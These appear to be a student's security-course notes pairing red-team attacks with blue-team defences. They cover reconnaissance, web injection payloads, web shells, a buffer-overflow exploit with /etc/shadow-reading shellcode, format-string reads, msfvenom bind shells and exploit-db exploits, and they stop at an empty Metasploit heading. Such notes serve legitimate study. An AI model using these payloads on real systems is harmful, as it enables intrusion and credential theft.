			Red team: Enimes, offensive operations,  atk a network to test the effectiveness of security controls, or of finding vulnerabilities in a web application or other software.
			Blue team: Defenders, responsible for setting up a secure network infrastructure, watching out for and responding to attacks and recovering from an attack.
		Defence in Depth>
			Military strategy at the time of the Roman empire
			Defenders would yield space to the attackers by falling back to the series of pre-arranged defensive positions
			multiple levels of protection must be employed: some preventative and some to detect a breach (better to detect and repsonse to a breach than to just prevent it)
			Identify and provide better security for critical assets then seperate from main system and protect indepedantly
			Find a workaround if you cant fully protect something
		Risk management>
			 Risk is the likelihood of an attack multiplied by the potential impact of the breach.
			 Areas of risk>
			 	Confidentiality: Access to systems should only be shared amongst authorised persons or organisations. 
				Integrity: The systems should be accurate, trustworthy and complete.
			 	Availability: The systems should be accessible when needed (No DDoS atks but valid users can access)
		Critical security controls>
			Inventory of Authorised and Unauthorised Software: Manage, inventory, track and correct all software on the network so only authorised software is installed and can run.
			Secure Configurations for Hardware and Software: Manage, track, report on and correct the security configuration of all devices on the network to prevent an attacker exploiting vulnerable services and settings.
			Continuous Vulnerability Assessment and Remediation: Continuously acquire, assess and take action on new information to identify vulnerabilities and remediate them, in order to minimise the window of opportunity for attackers to take advantage of newly publicised vulnerabilities in software or hardware.
			Controlled use of Administrative Privileges: Track, control, prevent and correct the use of administrative privileges on computers, networks and applications except where strictly necessary. (Normal users don't need administrative access).
			Maintenance, Monitoring and Analysis of Log Files: Collect, manage and analyse audit logs that could help detect, understand or recover from a breach.
			Email and Web Browser Protections: Minimise the attack surface (opportunities) for attackers to trick users through interaction with web browsers or email systems.
			Malware Defences: Control the installation, spread and execution of malicious code at multiple points in the enterprise.
			Limitation and Control of Network Ports, Protocols and Services: Manage, track, control and correct the ongoing use of ports, protocols and services on networked devices in order to minimise windows of vulnerability available to attackers. (Don't run services you don't need.)
			Data Recovery Capability: Properly back up critical information with a proven and tested process for timely recovery.
			Secure Configurations for Network Devices such as Firewalls, Routers and Switches: Establish, implement and actively manage the security configuration of network infrastructure devices in order to prevent attackers from exploiting vulnerable services and settings.
			Boundary Defence: Detect, prevent and correct the flow of information transferring across networks of different trust levels with a focus on security-damaging data. (Make sure information isn't flowing from a restricted network segment into an unrestricted one.)
			Data Protection: Prevent data exfiltration, mitigate the effects of exfiltrated data and ensure the privacy and integrity of sensitive information. (If an attacker is on the network, they will likely be attempting to get data out of the network onto their computers.)
			Controlled Access Based on the Need To Know: Track, control, prevent, correct and secure access to critical assets according to the formal determination of which persons, computers and applications have a need and a right to access these critical assets.
			Wireless Access Control: Track, control, prevent, and correct the security use of wireless local area networks, access points and wireless client systems.
			Access Monitoring and Control: Actively manage the life-cycle of system and application accounts - their creation, use, dormancy, deletion - in order to minimise opportunities for attackers to leverage them. (For example, if someone leaves the company, make sure to delete their user account, so they can't still log in.)
			Security Skills Assessment and Appropriate Training to Fill Gaps: Identify the specific knowledge, skills and abilities needed to support defence of the enterprise; develop and execute an integrated plan to assess, identify and remediate gaps.
			Application Software Security: Manage the security life-cycle of all in-house developed and acquired software in order to prevent, detect and correct security weaknesses.
			Incident Response and Management: Protect the organisation's information as well as its reputation by developing and implementing an incident response infrastructure. (If you do get breached, how do you respond?)
			Penetration Tests and Red Team Exercises: Test the overall strength of an organisation's defences by simulating the objectives and actions of an attacker.
		Stages of an atk>
			Reconnaissance: pick the target and find info: workers, internal hardware/software, probe for services that are exposed to the internet
			Initial Exploitation (Get presence on network): Look at network map and try to exploit any known vulnerabilities, if not try unknown/unpatched vulnerability, 
			 EG social enginning user to run malware, drop in an infected USB drive, call IT desk and reset PW, 
			Establish Persistence & Escalate Privileges (Gain admin access and re-connect at will): Maintain access and elevate privilages (if needed)
			 EG drop a backdoor, or finding some credentials for legitimate access, exploit again for admin account 
			Move Laterally (Get to key system): Spread from initial foothold to the rest of the network to achieve their goal 
			Exfiltration: Hacker trys to exfiltrate whatever data they were seeking
			
	Reconnaissance>		
		Search engine reconnaissance>
			Red team>
				find info/files with search engine>
					//Use certian flags to find a specific site
					site:sans.org, filetype:xls
					Use omitted resutls included to get redundant results (close to our search criteria)
				Get meta data info from found links>	
					//Download url of found file
						cd ~/Downloads
						wget https://www.sans.org/training/mgt512/paag.xls
					//Find meta data, look for creator and other info
						apt install exiftool
						exiftool paag.xls
				Above step automated>
					//Get metagoofil, use google to search for files on a certain domain
						apt install metagoofil
						pip install requests 
						rm -rf /usr/share/metagoofil/  
						git clone https://github.com/WiReD-/metagoofil.git /usr/share/metagoofil
					//Run it, -d: domain, -t: kind of files, -l: max number of google search results to look back, -o: target to download files to, -f: name of output file where results are saved
						metagoofil {} {} {} {}
					//EG
						metagoofil -d sans.org -t doc,pdf,xls -l 200 -o sans_files -f sans_results.html
			Blue team>
				//Need to use the above process more often to find what metadata about your company exists
				Extract metadata from your PDF files>
					//Display metadata
					exiftool OrganizationsCoreAssignment.pdf	
					//Install tools
						apt install pdftk
						apt install qpdf
					//Remove metadata
						exiftool -all:all= OrganizationsCoreAssignment.pdf
					Create a bash script that will make it harder to copy data>
						//EG with nano CLI editor
							nano clean_pdf
						//Paste script into nano file
							#!/bin/bash
							pdftk $1 dump_data | \
							sed -e 's/\(InfoValue:\)\s.*/\1\ /g' | \
							pdftk $1 update_info - output clean-$1
							exiftool -all:all= clean-$1
							exiftool -all:all clean-$1
							exiftool -extractEmbedded -all:all clean-$1
							qpdf --linearize clean-$1 clean2-$1
							pdftk clean2-$1 dump_data
							exiftool clean2-$1
							pdfinfo -meta clean2-$1
							mv clean2-$1 $1
							rm clean-$1
						//CTRL X to save and exit
					//Give executable permissions
						chmod 755 ./clean_pdf
					//Move to path
						mv ./clean_pdf /usr/bin/clean_pdf	
					//Run script (as it now exists in path)
						clean_pdf OrganizationsCoreAssignment.pdf	
		Robots>
			Red team>
				A robots.txt file is used to stop pages being indexed by search engine crawlers/spiders
				//Visit robots page
				https://sans.org/robots.txt		
			Blue team>
				//Dont use robots.txt, instead use robots meta tag on HTML headers of each page, spreads list of hidden pages throughout the website
				<meta name="robots" content="noindex" />
				
		Public job offerings and data>
			//Find out about people and companies with info avaliable to the public
			Job listings>
				Red team>
					//Look at job postings in IT fields to find tech
					EG Cisco tech, microsoft SQL servers, 
				Blue team>
					Regular links that are posted should not be tied back to the company
					Use a recruiting service which does not list the name of the company in the job postings. 
			LinkedIn>
				RT>
					Use emails recovered from metadata to find people.
					Find current and prior job titles, skills, contacts
					EG A job title of Network Administrator with Cisco verified status, then the company likely has cisco hardware on the network
					Use their details to social engineer them
				BT>
					ask them not to mention the company name on their profile
			Companies house>
				RT>
					public and private limited companies	
					typically only carries information on the officers of the company
				BT>
					Law requires companies house registration
			Wordlists & CeWL>
				//Create a wordList of common words used on a website and use to crack password hashes
				RT>	
					Intercept PW hashes going over a network
					Use a wordlist of common PW to crack them
					
					//You can improve your chances by making a custom wordlist based on the industry the target people
					Crawl a site and pull out common words>
							apt install cewl
						//-v: Verbose (more info), -d: Max link depth to crawl through, -w: outputFile
							cewl {} {} {} [targetSite]
						//EG
							cewl -v -d 1 -w words.txt https://www.sans.org
				BT>
					make sure building a wordlist is ineffective by enforcing a good password policy
					
		Prior breaches>
			//Find emails and check against breaches for leaked PWs
			RT>
				If people have strong hard to remember passwords they reuse them
				When a service gets hacked the comprimised PW can be used to log into other services (maybe even corporate systems) 	
				Process>
					Use names to find personal emails with Maltego -> Use https://haveibeenpwned.com/ and check email for 
					 breaches their passwords were disclosed in -> find original archive of a breach and look up email 
			BT>
				Same as red team try to find PWs from breaches and check if leaked PWs are used on company systems.
				Implement employee awareness programme to stop password re-use.
				Recommend PW managers
				Warn people of breaches
				
		DNS info>
			//Get more info with a domain name, find a domain name
			Whois>
				RT>
					/*WHOIS system is responsible for keeping track of who is responsible for a domain name
					Intended to provide contact details for domain owners
					Many people use WHOIS privacy services, which mean third party contact details are provided who forward the info
					
					Despite above concerns, you can search the WHOIS database
					*/
						whois sans.org
					//Use third party sites for a reverse WHOIS
					//EG enter registrant name, email address, IP address on Viewdns.info
				BT>
					WHOIS privacy service, however sometimes it is better to establish clear ownership
			DNS Recon>
				//Using a domain name get DNS records, get sub domains
				RT>
					Zone transfer>
						//Aim to get a list of all DNS records for the target domain
						//unlikely to succeed 
						
						//If we known a domains authoritative name server and its misconfigured to allow zone transfers from unauthenticated sources 
						host -l [domainName] [vunerableNameServerIP]
					enumerate DNS records using a wordlist>
						//Guess valid sub domains, blank: Use default worldist, -W [wordListName]: 3rd party wordList, can use Kali Linux /usr/share wordlists
						dnsmap [domainName] {}
						//EG tries wordListItem1.domainName wordListItem2.domainName
						//If results are returned, then subdomains exist and associated IP addresses are returned.
						
						//Domain name tree hierarchy EG: .com (Top level)-> example.com -> west.example.com and east.example.com (subdomains)
				BT>	
					Make aure DNS servers not configured to allow DNS zone transfers.
					Avoid exposing internal DNS to the public internet (hide internal network layout), have internal DNS server 
					 and external DNS servers (to deal with internet facing servers, EG websites, email)	
			Dirb>
				//Find hidden directories in a website
				RT>	
					//Armed with a list of websites, you could start to find directories that are not linked directly in the public areas of the site.
					//Use a wordList to craft HTTP requests
					dirb http://myfakedomain.local /usr/share/wordlists/dirb/small.txt
				BT>
					//Dont put things on the internet unless password connected
					//A dirb generates lots of failed requests in the server logs
		NMap>
			// Using targets IP addresses port scan for to find services running
			RT>
				//Aim to find ports which have a vulnerable service listening
				//If there are no vulnerabilites, you could try the software and try to find a bug for a 0-day vulnerability
				
				//Connect scan (dont need root permissions, obvious scan that firewalls/IDS systems will flag)
				//-vv: 2nd level of verbosity (print Nmaps actions), -sT: TCP connect scan, -p-: Scan all ports (rather than just a 1000)
					nmap -vv -sT -p- 127.0.0.1
				//syn scan, normal tcp on open ports: Syn -> Syn-Ack -> Ack, syn scan: Syn -> Syn-Ack, closed ports: Syn -> Rst 
					nmap -vv -sS -p- 127.0.0.1				
				
				//Connect to open ports to get more info on running services
					nc 127.0.0.1 22
				//Do above step in nmap, with a version detection scan 
					nmap -vv -sV -p- 127.0.0.1	
				//Fingerprint OS 
					nmap -vv -O -p- 127.0.0.1	
				//Because UDP is connection-less, UDP scans can take a long time and aren't necessarily accurate.
				//UDP scan
					nmap -vv -sU -p- 127.0.0.1	
				
				Scan types>
					Horizontal scan: scan against a group of IPs for a single port.
					Vertical scan: a single IP being scanned for multiple ports.
					Passive scan: Doing something not easily traceable to your IP 
			BT>
				Patch software listening on ports, have a patch cycle of a few weeks
				A good firewall or Intrusion Detection System (IDS) will usually pick up port scans and act to block them	
				Test your firewall and IDS via running Nmap and checking accuracy of scan results
		
		//Other tools: Maltego (Data mine a domain)
	Exploitation>
		//Aim is to get a foothold on the network
		Developing exploits for common vulnerabilities>
			Website exploitation 1>
				Command Injection>
				//Targets web apps that process user input and pass it to the command line
					RT>
						//Look for a text area and signs that the web app is using a CLI

						//EG vulnerable code, it gets the input from the url bar and passes to the CLI
						<?php
						  if(isset($_GET['string']) && $_GET['string']!="") {
							  echo shell_exec('ls -l '.$_GET['string']);
						  }
						?>
						//Chain commands, can also use && to join commands, EG use commands ls, whoami
						[expected command]; [targetCommand]

						//If the command is operated on in a specifc way you may have to act differently
						//EG for a web app that transforms your input to sha1, if may run
							echo "[yourInput]" | sha1sum
							//Full command you want to run
							echo "something"; [targetCommand]; echo "security" | sha1sum
							//But the cursor (where your input is entered) is inbetween the "" after the echo (echo "[cursorLocation]")
							//So you actually want to run
							" "; [targetCommand]; echo "[intendedInput]"
							//To run this, enter an intended word -> targetCommand -> emulate anouther echo command entirely
							//Enter into the url bar
							[something]; [intendedCommand]; echo "[intendedInput]"  
					BT>	
						Dont use the command line, use a scripting language
						Filter ; && || and other command injection characters, use a third party library to do it properly
				Cross Site Scripting (XSS)>
					RT>	
						//Client-side atk, so aim to run code on a site visitors PC
						//Reflected XSS (just uses the url bar)
							//EG for an app that takes a ?name parameter
							?name=bob<script>alert("hahahahaha");</script>
							//To attack someone, you'd have to send them the link with the JavaScript in it and have them click on it.
						//Stored XSS
							//XSS attack is stored in the database, such as in a forum post, anyone who visits the effected page will get the link
					BT>
						//Sanitise user input, use a third party library to get all characters
						//EG for PHP use the Zend Escaper file from the Zend framework
				File Inclusion>
					RT>
						//comes as a result of including resources on a page
						//EG vulnerable code
						<?php
						if (isset($_GET['file']) && $_GET['file']!="") {
								require($_GET['file']);
						} else {
								echo "File 404.";
						}
						?>
						//enter into the url: ?file=/etc/password

						//See you can upload infected PHP to the web server, then point the url to the file
						// PHP stores access logs of a server, so the malicious code will be stored here
						//If you then include those access logs, the code you inserted by making GET requests will be executed.

						//remote file inclusion allows us to include files on remote systems also.
					BT>
						//avoid dynamically including files based on user input. 
						//If not, then your script should have a whitelist of allowed files that can be included.

						//To stop remote file inclusion, edit php.ini and turn off 'allow_url_include'
				SQL Injection>
					RT>
						//A SQL injection attack is found when a SQL query is built up using user input
						//EG 
						SELECT username, password FROM users WHERE username="[user input]";
						//Identify an SQL injection flaw by causing a SQL error EG
						SELECT username, password FROM users WHERE username="bob"";

						//add to the end of the statement
						"SELECT * FROM users WHERE '' OR 1=1 #"
						Blind SQL injection>
							//A harder variation 
							//This is where there is a SQL injection flaw, but the place where the flaw exists doesn't print the result of the query. 
							//If so use a query like
							 //Does the first letter of the username field in the first row of the users table equal 'A'? If yes, sleep for 15 seconds.
							 //If the page takes 15 secs to load then it matches
					BT>
						//Always use prepared statements to pass queries to the database.
						 //When the query is made, the programmer will specify which parts of the query are data. These areas will then always be treated as data and cannot be mistaken for part of the query, no matter what is entered.

						// '' can be used to escape charcaters in sql query, EG 'this''
			Website exploitation 2>
				Sessions guessing>
					//TODO add cookie flags
					RT>
						When you log into a site, the site will give you a session token, which identifies you so when you later come back to the site, your browser will automatically present the session token
						You can steal them via XSS, or session guessing so you can impersonate someone
						Look for certain vulnerabilites
							ST of 505, small number of numerical values to guess
							ST of user-01829, likely that the ID from the users table is being used, ID never expires/changes and ID is numerical
							ST of 059923134c975b4516bef2472669a57e, then next login ST of c7a6401e0ebed7a2b701e00eed33c1b9, MD5 (504, 505), still easy to try
						Usually, the best way to enumerate valid session tokens if you do spot a pattern is to write a program that loops to send the session token as part of a GET request,
					BT>
						use truly random session tokens that expire
						keep track of which session belongs to which user

						There are cases where you do have to implement your own session management, EG if you are using a micro-services model where traffic is load balanced across multiple servers. 
						You need a central session store (in a database), instead of relying on each server to store the session.
						 so if a user gets redirected to a different server halfway through using the application, they will not be considered logged in anymore on the new server without a central session store.
				Clickjacking>
					RT>
						//where a user can be tricked into clicking on something without even realising they did it. 
						//EG a site is loaded into an attacker controlled page using an iframe (this is an HTML entity which can load a 
						// site inside a frame on the page). The iframe is made invisible, and the attacker controlled page overlays a button onto the entity the attacker wants the user to click.

						//Coinhive is a company that makes cryptocurrency mining software that runs in people's browsers.
						//When antivirus blocked them they created 'authed mine' where the user is asked for consent and it is loaded in an iframe
						 //Though a clickjacking atk which hides the authorisation forms iframe from the user and overlaps site buttons onto the accept button

						 //EG code
						 <!doctype html>
						<html>
						<head>
						  <meta charset="UTF-8">
						</head>
						<body>
						  <style>
							iframe {
							  width: 400px;
							  height: 100px;
							  position: absolute;
							  top: 5px;
							  left: -14px;
							  opacity: 0;
							  z-index: 1;
							}
						  </style>
						  <div>Button Clicker Game!</div>
						  <iframe src="target.html"></iframe>
						  <button>Click Here</button>
						</body>
						</html>
						 //So by clicking on a button, we are actually calling the target.html file which can have a different button
					BT>
						//web server should send an X-Frame-Options header in the HTTP response for every page
						// Which should have one of 3 values
							//DENY: prevent the page from ever being loaded into an iframe.
							//SAMEORIGIN: Only allows for pages on the same domain
							//ALLOW-FROM domain.com: Only allows for the specified domain
				Cross Site Request Forgery (CSRF)>
					RT>
						//Get someone to click on a link to access a site, then their session cooky authorises something to happen
						//EG if someone uses the same bank and a session cooky logs them in automatically so the transaction is authorised 
						terriblebank.fake/transfer.php?to=bob&amount=50
					BT>
						//When making a request to a web server the browser will tell it which site the request is coming from through the origin header or referrer header
						//Make sure every HTTP request submitting a form or any other kind of input has an origin/referrer header of 'same origin'.

						//Or use a CSRF token, which is required by every form or input on the site.
							//Token needs to: be generated before any input (site has to be visited first), unique to the user (hacker cant gather a token), random value
							//Token value is filled into a hidden field or submitted otherwise	

							//Only use POST requests for sensitive form submissions so a CSRF token cant be leaked
				Directory Traversal>
					RT>
						//File is loaded based on a filename provided by the user
						//Keep going back a directory to get to the place you want
						//EG
						?page=../../../../etc/passwd
					BT>
						//not to use user input when making file system calls

						//Use a index, then a series of conditionals chose the file
						view.php?language=english -> view.php?language=1
						//Or filter out characters and encoded alternatives
						%2e%2e%2f, %2e%2e/, ..%2f, ..%c0%af = ../
						//As usual it is best to use a library
				File Upload>
					RT>
						A file upload vulnerability is a flaw where the user can upload an arbitrary file to the server and then visit it to execute code.
						site may tell you where your file was uploaded to, or you can guess
						Upload file -> navigate to uploads page and run the file
						EG upload shell.php, then naviage to [ip]/uploads/shell.php?cmd=whoami

						Sites normally have file type upload restrictions, you can try to bypass them
							Rename to shell.php.jpg
							Editing the POST request to change the MIME type of the PHP file to make it seem like it is an image.
							Uploading a '.htaccess' file to change the files which are allowed to be uploaded.
					BT>
						Restrict which files are allowed to be uploaded based on a whitelist.
						Scan uploaded file headers
						Rename file, according to naming convention, store files in DB rather than file system
						Make sure the upload directory does not have executable permissions and only the upload folder has write permissions
						Scan the uploaded files for malware.
						Make sure files such as .htaccess cannot be replaced by the upload form
						Make sure files with double extensions cannot be executed (Apache is weak to this)

				Vulnerability Scanners>
					RT>
						Scanners work by crawling all the pages on a site and making an index of them, then going to each site and attempting multiple web application attacks against every form of user input on the site.
						If it sees successful behaviour then it lists the flaw
						Considerations>
							Known what the scanner does
								So only perform the atks the client has asked you to check
							Make sure you've configured your scanner to log into the site if that is what is required
								May need to test the site with several multiple authorities: unauthenticated, normal user account, administrator's	
								Some tools log in and log in automatically next time
								Some tools dont so you have to provide a valid session token
							Make sure you tell your scanner what to avoid
								Dont follow certain links: logout (invalidating own session), PW reset form 
							Captcha
								Ask owners to disable it	
							Read the scanner's log files to make sure it is working in a sensible manner.
								If it's just following a redirect to the login page or if every request is producing an error then something is likely wrong.
						Try to exploit each finding manually to make sure the scanner didn't produce a false positive
							EG	A single quote triggers SQL injection flaw
								Blind SQL injection flaw uses a time delay but internet lags
						Look for false negatives
							 Identify high-risk areas of the site and focus in on them.
					BT>
						Scanners are noisy, the logs produced are an indication that someone is going to atk
						run a 'web application firewall' (WAF) in front of your web app
						 this intercepts suspicious requests and deny access
			Binary application flaws>
				//Use debuggers to find flaws
				//GDB is a GNU debugger
				 //It doesnt diffferentiate what format stored data in a memory address is

				//Install a usefull pluggin for GDB
					sudo apt install git
					git clone https://github.com/pwndbg/pwndbg
					cd pwndbg
					./setup.sh
				//Check a program with GDB
					gdb ./password
				// from the pwndbg> prompt
				//Aliases: run: r, break: b, continue: c, Quit: q
					//Run it
						run
					//Get functions
						info functions
					//You can pause a programs execution by setting a break point
							break *[functionName]
							break *[functionMemoryAddress]
						//Now run the program to get a response
								run
							//Output areas
								//1: tells us which breakpoint caused the program execution to pause.
								//2: CPU registers
								//3:  Assembly (the C compiler converts C to assembly)  
								//4: RAM Stack
								//5: Backtrace contains functions that build up to the breakpoint (__libc_start_main in the standard function used to call a program)
							//Since EIP (instruction pointer) points to the next instruction, the breakpoint function should be here
							//Also the instuction shown at point 3 hasn't been run yet

							//Continue the program
								continue
							//Continue moving through the program and step into call instructions (you have to go through that function instruction by instruction) (can be useful to call custom functions but a pain for standard ones)
								step
							//or continue but step over function calls
								next
							//Quit
								quit
						//Inspect memory
							//i: View instruction normally, x: View as hex, s: view as string
							 //[instructionMemoryAddress], [memory registers]
								x/{} {}
							//EG
								x/i 0x565555a1
								x/x $esp
							//Show multiple enteries
								x/20x $esp
						//Disable a function
							disas [functionName]

				Analysing a file for a purpose>
				//EG exploiting following code to get the password
					#include <stdio.h>
					#include <string.h>
					int main() {
						char *password = "ThisIsMyPassword\n";
						char input[151];
						puts("Please enter the password:");
						fgets(input, 149, stdin);

						if (strcmp(input, password) == 0) {
							puts("Success!");
						} else {
							puts("Fail!");
						}
						return(0);
					}	

					//Set a breakpoint at *main and run the program, spam next until you get to soemthing that looks like fgets
					//Enter any password and check the next instruction, there a C function for comparing values is called and the parameters are show by pwndbg
					 //to get the PW
					 x/s [otherParametersMemoryAddress]
					 //Get the rest of that password that runs over into the next memory address
					 x/2s [otherParametersMemoryAddress]
				
				https://reverseengineering.stackexchange.com/questions/1935/how-to-handle-stripped-binaries-with-gdb-no-source-no-symbols-and-gdb-only-sho#1936
				https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf
				
				Integer overflow>
					RT>
						Signed or unsigned
							A signed 32 bit integer -32,767 to +32,767, unsigned: 0 to 65535, "^16 = 65535 so 16 bits in size"
							A short is similar to an integer, A signed long ((2^31) - 1)): -2,147,483,647 to +2,147,483,647, unsigned: 0 to 4,294,967,295	

						Enter 2,147,482,648 into an program input, then the sign bit changes 0 -> 1 (so -ve)
						//Can do underflow with -2,147,482,648
					BT>
						//Check calculations and storage of signed integers fall within allowed range

				Buffer overflow>
					RT>
						//Limited space reserved for a input but program doesnt check the input will fit.
						 //So this allows us to overwrite adjacent memory addresses
						//Turn off ASLR buffer overflow protection
						echo 0 > /proc/sys/kernel/randomize_va_space 

						//EG
							// Compile with gcc -m32 -fno-stack-protector -z execstack -o buffer buffer.c
							#include <stdio.h>
							#include <stdlib.h>
							#include <string.h>
							#include <unistd.h>
							int overflow()
							{
							  char buf[80];
							  int r;
							  r = read(0, buf, 1000);
							  printf("Read %d bytes.\n", r);
							  return 0;
							}
							void printFlag()
							{
							  printf("%s\n", "You ran the mystery function!");
							}
							int main(int argc, char **argv)
							{
							  printf("Overflow the buffer to execute the function at memory address: %p\n", &printFlag);
							  overflow();
							  return 0;
							}
							//The buf array only has room for 80 bytes 
							//Create a file filled with characters
								python -c "print('A' * 200)" > input
							//Feed the new file into the buffer
								./buffer < input
							//Check with GDB
								gdb ./buffer
								run < input
							Identify overflow>
								Invalid address warning given, check that memory address
								 the next few memory addresses are full of the ASCII for the letter A (0x41414141)
								 Reminder from the C section 
									When a function is called (in this case the main function), a memory address 
									 is written to the bottom of the stack frame; this is called the return pointer. The return pointer is where 
									 the CPU is going next after it is done with the current function. When the function ends, and it gets to the 
									 'ret' or return instruction, it goes to the value at the bottom of the stack frame and loads that return pointer into 
									 EIP (the memory register that holds the address of the next instruction).
								//0x41414141 overflowed into the return instruction so EIP loaded data
							Exploit overflow>
								//Figure out what characters overflowed the return pointer
										wget https://raw.githubusercontent.com/Svenito/exploit-pattern/master/pattern.py
									//Tell the program to generate a 200-byte cyclic pattern (any four bytes at any point are unique)
									python3 pattern.py 200 > input
										gdb ./buffer
										run < input
									//Remember memory location of the crash (0x41326441)
									//Figure out how many bytes there are before the overflow (in the patturn)
										python3 pattern.py 0x41326441

									Consider>
										The return pointer is four characters for 32 bit system and 8 for 64 bit system
										 Endianness memory address format: 0x565555c7
										 Little-endian format: 0xc7555556, generally programs use this one
										  Convert to Little-endian by reversing the hex value in pairs (since 2 hex charcters repersent one byte)
										   0xd34dc0de -> 0xdec04dd3: bring de to the front, then c0, then ...
										   
								Create script to exploit>
									Run a memory address>
										nano exploit.py
											import struct
											offset = 96
											#Format target memory address into Little-endian
											rp = struct.pack("<L", 0x565555c7)
											exploit = ""
											exploit += "A" * offset
											exploit += rp
											exploit += "C" * 20
											print(exploit)
										python3 exploit.py > input, gdb ./buffer, run < input
										//Now the memory address is written to the return pointer
										//Test out without GDB to run the code at that memory address
											./buffer < input
									Run shellcode>
										//Shellcode is data which the CPU can interpret as functions

										//We can pass the processor shellcode, which is assembley code with pure hex instead of labels
										//Example shellcode to and equal assembley to print /etc/shadow	contents
											\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x61\x64\x6f\x77
											\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe1\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80
											31 c0                    xor    %eax,%eax
											50                       push   %eax
											68 2f 63 61 74           push   $0x7461632f
											68 2f 62 69 6e           push   $0x6e69622f
											89 e3                    mov    %esp,%ebx
											50                       push   %eax
											68 61 64 6f 77           push   $0x776f6461
											68 2f 2f 73 68           push   $0x68732f2f
											68 2f 65 74 63           push   $0x6374652f
											89 e1                    mov    %esp,%ecx
											50                       push   %eax
											51                       push   %ecx
											53                       push   %ebx
											89 e1                    mov    %esp,%ecx
											b0 0b                    mov    $0xb,%al
											cd 80
										New exploit script>
											import struct
											offset = 96
											rp = struct.pack("<L", 0x565555c7)
											#The nop instruction means do nothing and move to the next instruction
											nop = "\x90"
											payload = ""
											payload += "\x31\xc0\x50\x68\x2f\x63\x61\x74\x68"
											payload += "\x2f\x62\x69\x6e\x89\xe3\x50\x68\x61"
											payload += "\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68"
											payload += "\x2f\x65\x74\x63\x89\xe1\x50\x51\x53"
											payload += "\x89\xe1\xb0\x0b\xcd\x80"
											exploit = ""
											exploit += "A" * offset
											exploit += rp
											exploit += nop * 200
											exploit += payload
											print(exploit)
										//python exploit.py > input, gdb ./buffer, run < input
										//View instructions after the return pointer
										x/100x $esp

										//the memory addresses we see inside GDB will be slightly off, if we're one byte off then the code wont execute properly
										 //thanks to the 'nop sled' no matter where the EIP is pointed execution will continue until it reaches the shellcode
										//Once it works in GDB
										 //Increase the nops and keep increasing the memory address blindly until it works on the program
										python exploit.py | ./buffer

					BT>
						//always check the input length that a user has entered will fit into the buffer allocated for it
						//All compiler mitigations can be bypassed under certain circumstances
						Potential mitigations>
							Stack Protector / Stack Canary>
								A value that sits before the return pointer, before the RV is loaded into the EIP the stack canary is checked and if it was overwritten the program terminates
								Can usually be bypassed by finding out the value the canary is expected to be and overwriting it with the same value.
								Great to identify buffer overflow attempts 
								 Make this harder by using a null byte value since many C user input functions stop reading data when they see a null byte
							NX (No Execute (Linux)) / DEP (Data Execution Policy (Windows))>
								Separates areas of the stack into code and data (The CPU knows that the pointed to area of the stack is marked as not executable), so we cant put shellcode in memory							
							ASLR (Address Space Layout Randomisation)>
								involves randomising the memory addresses that a program gets loaded into on each run.
								The address of the shellcode will keep changing so its impossible to use a memory address that works evertime 
								ASLR doesnt support some code

				Format string>
					RT>
						C reminder
							String specifiers used to insert variables into a string, the specifier needs to match the data type
							printf("There are %d days before Christmas", days);
						//Using prinf without a format string specifier causes a vulnerability	
						printf("hello");	

						//EG, vulnerable code
							// Compile with gcc -m32 -o format format.c
							#include <stdio.h>
							#include <string.h>

							int main() {
									char input[151];
									char *password = "ThisIsNotMyPassword\n";
									printf("Enter the password stored at memory address %p:\n", &password);
									fgets(input, 150, stdin);

									puts("The password you entered is:");
									printf(input);

									if(strcmp(input, password) == 0) {
											puts("Well done!");
									} else {
											puts("Failed :(");
									}

									return(0);
							}
							Enter a %d when running the program
							//printf never expected a format string specifier so no data is passed to the string, but there is now 
							 // so printf is going to look at the area of memory where it expects some data to be to fill it into the string.
							 //So memory can be read off the stack as you want

							//Use PWs memory address in little-endian (backwards)
							// afterwards use four %x to compensate for the four bytes of the memory address we just entered			
							// then get the string itself 
							 \x14\xd3\xff\xff %x.%x.%x.%x.%s
					BT>	
						//Never use printf without a format string
						printf("%s", "This is the text I want to print");
						//Or if you want a newline
						puts("print this stuff");

		Existing exploits>
			 responsible disclosure:  researcher will reach out to the company and inform them of exploit -> bug bounty 
			 -> researcher and the affected company will work together to produce a timeline which is resonable for producing a patch
			  -> after the patch tha researcher discloses the bug so affected users can patch the bug	
			Sometimes they dont agree on a timeframe as they are too short, however  
				hackers could already known about the exploit and are keeping it to themselves	
				goverments keep them (EG NSA and EternalBlue)
			Since most exploits are released in a process of responsible disclosure
			 if you can find software that is vulnerable to an existing exploit which has been published, it likely means that someone has failed to patch that piece of software. 
			Search
				Software VersionNo. exploit
			https://www.exploit-db.com/
			
			Exploiting an FTP Service>
				
				Identify FTP service and find vulnerabilities>
					//Scan for open ports
						nmap -vv -sV 192.168.182.157
					//Check exploit-db.com for vulnerabilities
					// EG FreeFloat ftpd 1.00 file server running on windows XP
				Create exploit script>
					//Copy exploit to py file: EG freefloatftp.py
					//Generate shellcode with metasploit framework msfvenom tool
						//-a: architecture (x86 for 32 bit), -p: payload (EG bind to a port and wait for you to connect), --platform,
						// -b: bad characters (0x00 is a null byte, 0x0d is a carriage return, 0x0a is a newline character, any of these could cut of the input), -f: output format, [targetPort]: Dont use the target port if you just want to test the shellcode or exploit 
							msfvenom -a x86 -p windows/shell_bind_tcp --platform windows -b \x00\x0a\x0d -f python LPORT=4444
					//Swap exploit shellcode in the script with the new shellcode	
				
				Carry out the exploit>
					//Run python script
						python freefloatftp.py 192.168.157 21
					//With netcat Connect to the listener that was launched by freefloatftp.py 's on the target port
						nc 92.168.182.157 4444
			Exploit a web service>
				//Find versiosn of the software
					//Download several versions of the software -> look at the HTML in the index pages and JavaScript files with version numbers in them -> compare what yo usee on the target with downloaded versions
					//Or try exploits for several versions to find the working one
				//EG ubuntu server running mybb.com
				https://www.exploit-db.com/exploits/29935/
				//Its exploitable via a php injection flaw, but the script requires admin privalleges 
				//Save to UbuntuServerExploit.php
				//Install php on target system
					sudo apt install php-cli php-curl
				//Run script
				//url, username, PW
					php exploit.php http://127.0.0.1 admin admin
				//This gives you a shell on the server that runs the forum software, with the same permissions as the exploited software
				
				//The exploit works by sending a get request with a terminal command encoded in base64, along with a set exploit key
					echo "whoami" | base64 
				http://127.0.0.1/inc/languages/english.php?key=81994840aff71b18ebb0817e0e6f786c&exploited=d2hvYW1pCg==
				
			Metasploit framework>
				Install>
